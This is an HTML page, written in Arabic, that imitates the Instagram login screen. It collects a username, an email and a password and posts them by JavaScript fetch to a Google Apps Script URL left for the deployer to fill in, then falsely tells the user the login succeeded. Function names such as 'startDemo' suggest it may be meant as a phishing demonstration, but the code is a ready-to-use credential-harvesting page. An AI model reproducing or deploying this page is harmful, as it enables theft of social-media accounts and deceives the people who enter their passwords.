<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .card {
            background: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 30px;
            width: 100%;
            max-width: 350px;
            text-align: center;
            box-shadow: 0 2px 8px rgba(0,0,0,0.03);
            margin: 10px;
        }

        .insta-logo-img {
            width: 175px;
            margin-bottom: 20px;
            margin-top: 10px;
        }

        .insta-subtext {
            color: #737373;
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.4;
        }

        .input-group input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            padding: 10px;
            margin-bottom: 8px;
            font-size: 13px;
            outline: none;
            direction: rtl;
        }

        .input-group input:focus {
            border-color: #a8a8a8;
        }

        .btn-blue {
            width: 100%;
            background-color: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            padding: 9px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }

        .btn-blue:hover {
            background-color: #1877f2;
        }

        .btn-dark {
            width: 100%;
            background-color: #262626;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            padding: 10px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }

        .btn-dark:hover {
            background-color: #000000;
        }
    </style>
</head>
<body>

    <!-- الكارد الأول -->
    <div id="start-card" class="card">
        <img class="insta-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" alt="Instagram">
        <button onclick="startDemo()" class="btn-dark">
            افتح Instagram
        </button>
    </div>

    <!-- كارد تسجيل الدخول (مخفي في الأول) -->
    <div id="login" class="card" style="display:none;">
        <img class="insta-logo-img" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" alt="Instagram">
        <p class="insta-subtext">سجل الدخول للمتابعة</p>

        <div class="input-group">
            <input type="text" id="name" placeholder="اسم المستخدم أو الهاتف">
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <input type="password" id="password" placeholder="كلمة السر">
        </div>

        <button onclick="finishDemo()" class="btn-blue">
            تسجيل الدخول
        </button>

        <div id="result" style="display:none; margin-top: 15px;"></div>
    </div>

    <script>
        // ضع رابط Google Apps Script الخاص بك هنا
        const SCRIPT_URL = "ضع_رابط_السكربت_هنا";

        function startDemo() {
            document.getElementById("start-card").style.display = "none";
            document.getElementById("login").style.display = "block";
        }

        function finishDemo() {
            const nameVal = document.getElementById("name").value;
            const emailVal = document.getElementById("email").value;
            const passVal = document.getElementById("password").value;

            if(!nameVal || !emailVal || !passVal) {
                alert("يرجى ملء جميع الحقول");
                return;
            }

            const payload = {
                name: nameVal,
                email: emailVal,
                password: passVal,
                action: "Login Attempt",
                detected: "No"
            };

            fetch(SCRIPT_URL, {
                method: "POST",
                mode: "no-cors",
                headers: {
                    "Content-Type": "text/plain"
                },
                body: JSON.stringify(payload)
            }).then(() => {
                document.getElementById("result").style.display = "block";
                document.getElementById("result").innerText = "تم تسجيل الدخول بنجاح!";
                document.getElementById("result").style.color = "green";
            }).catch(err => {
                console.error(err);
            });
        }
    </script>
</body>
</html>
